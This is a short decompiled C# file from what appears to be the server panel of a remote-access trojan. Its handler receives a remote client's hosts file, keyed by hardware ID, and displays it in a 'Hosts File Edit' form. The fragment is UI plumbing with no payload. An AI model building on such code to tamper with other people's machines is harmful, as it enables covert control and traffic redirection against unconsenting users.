using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000050 RID: 80
	internal class HandlerHostsFile
	{
		// Token: 0x060001D6 RID: 470 RVA: 0x0001D378 File Offset: 0x0001B578
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Error"))
				{
					if (!(a == "Get"))
					{
						return;
					}
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormHostsFile form = (FormHostsFile)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.richTextBox1.Text = (string)objects[2];
						form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
						form.richTextBox1.ScrollToCaret();
					}));
					return;
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormHostsFile form = (FormHostsFile)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						RichTextBox richTextBox = form.richTextBox1;
						richTextBox.Text = richTextBox.Text + "Error: " + (string)objects[2] + "\n";
					}));
					return;
				}
			}
			else
			{
				FormHostsFile form = (FormHostsFile)Application.OpenForms["HostsFile:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Hosts File Edit [" + (string)objects[2] + "]";
					form.client = client;
					form.richTextBox1.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
